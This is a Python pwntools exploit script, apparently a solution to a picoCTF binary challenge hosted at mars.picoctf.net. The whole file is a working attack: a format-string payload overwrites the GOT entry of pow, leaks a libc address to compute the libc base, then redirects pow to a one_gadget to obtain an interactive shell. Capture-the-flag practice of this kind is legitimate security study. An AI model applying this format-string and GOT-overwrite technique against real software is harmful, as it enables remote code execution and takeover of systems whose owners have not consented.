from pwn import *

context.binary = exe = ELF('./chall')
libc = ELF('./libc.so.6')

# io = process()
# gdb.attach(io, api=True)
io = remote('mars.picoctf.net', 31929)

io.recvuntil(b'A: ')
payload = b'1000000 ' + fmtstr_payload(11, {exe.got['pow']:exe.sym['main']}, 27)
io.sendline(payload)
io.recvuntil(b'B: ')
io.sendline(b'69 %109$p')

io.recvuntil(b'69 0x')
libc.address = int(io.recvline(keepends=False), 16) - (libc.sym['__libc_start_main']+243)
log.info(f'Libc base: {hex(libc.address)}')

one = 0xe6c81
io.recvuntil(b'A: ')
payload = b'1000000 ' + fmtstr_payload(11, {exe.got['pow']:(libc.address+one)}, 27)
io.sendline(payload)
io.recvuntil(b'B: ')
io.sendline(b'69')

io.interactive()